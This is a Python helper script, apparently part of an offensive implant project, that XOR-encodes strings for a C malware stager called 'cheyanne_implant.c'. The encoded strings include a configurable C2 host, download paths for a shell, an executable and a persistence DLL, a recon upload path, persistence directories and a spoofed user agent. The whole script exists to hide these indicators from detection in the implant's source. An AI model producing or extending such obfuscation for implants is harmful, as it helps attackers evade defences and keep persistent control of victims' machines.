"""
gen_implant_xor.py — Generate XOR-encoded arrays for cheyanne_implant.c
Usage: python stagers/gen_implant_xor.py [key_hex]
       python stagers/gen_implant_xor.py 0x5E   (default)
       python stagers/gen_implant_xor.py 0xA3   (new key)

Outputs C arrays ready to paste into cheyanne_implant.c.
Also outputs the IP-specific arrays when given --ip flag:
       python stagers/gen_implant_xor.py 0x5E --ip 192.168.1.100
"""

import sys

DEFAULT_KEY = 0x5E

STRINGS = {
    "xHost": ("127.0.0.1", "C2 Host"),
    "xPathDark": ("/dark_room", "URL: dark room download"),
    "xPathShell": ("/shell", "URL: shell download"),
    "xPathPersist": ("/persist", "URL: persistence DLL download"),
    "xPathRecon": ("/recon", "URL: recon upload"),
    "xDarkName": ("dark_room.exe", "Local filename: dark room"),
    "xShellName": ("cheyanne_shell.exe", "Local filename: shell"),
    "xPersistName": ("osppc.dll", "Local filename: persistence DLL"),
    "xLocalDir": (".local", "Persistence dir component"),
    "xBinDir": ("bin", "Persistence dir component"),
    "xTempEnv": ("TEMP", "Env var: temp directory"),
    "xProfileEnv": ("USERPROFILE", "Env var: user profile"),
    "xAgent": ("Mozilla/5.0 (Windows NT)", "HTTP user agent"),
    "xCanary": (r"C:\Windows\Temp\cheyanne_implant_canary.txt", "Canary path"),
}


def encode(s, key):
    return [b ^ key for b in s.encode("ascii")]


def format_array(name, encoded, comment, key):
    hex_vals = ", ".join(f"0x{b:02X}" for b in encoded)
    lines = []
    lines.append(f"/* \"{STRINGS[name][0]}\" XOR 0x{key:02X} */")
    lines.append(f"static const unsigned char {name}[] = {{")

    row_size = 10
    for i in range(0, len(encoded), row_size):
        chunk = encoded[i:i+row_size]
        hex_str = ", ".join(f"0x{b:02X}" for b in chunk)
        if i + row_size < len(encoded):
            lines.append(f"    {hex_str},")
        else:
            lines.append(f"    {hex_str}")

    lines.append("};")
    lines.append(f"#define {name}_LEN {len(encoded)}")
    lines.append("")
    return "\n".join(lines)


def main():
    key = DEFAULT_KEY
    custom_ip = None

    for arg in sys.argv[1:]:
        if arg.startswith("0x") or arg.startswith("0X"):
            key = int(arg, 16)
        elif arg == "--ip":
            idx = sys.argv.index("--ip")
            if idx + 1 < len(sys.argv):
                custom_ip = sys.argv[idx + 1]

    if custom_ip:
        STRINGS["xHost"] = (custom_ip, f"C2 Host: {custom_ip}")

    print(f"/* XOR Key: 0x{key:02X} */")
    print(f"#define XOR_KEY 0x{key:02X}")
    print()

    for name in STRINGS:
        plaintext = STRINGS[name][0]
        encoded = encode(plaintext, key)
        print(format_array(name, encoded, STRINGS[name][1], key))

    # Verification
    print("/* === VERIFICATION ===")
    for name in STRINGS:
        plaintext = STRINGS[name][0]
        encoded = encode(plaintext, key)
        decoded = "".join(chr(b ^ key) for b in encoded)
        status = "OK" if decoded == plaintext else "FAIL"
        print(f" * {name}: \"{plaintext}\" -> [{status}]")
    print(" */")


if __name__ == "__main__":
    main()
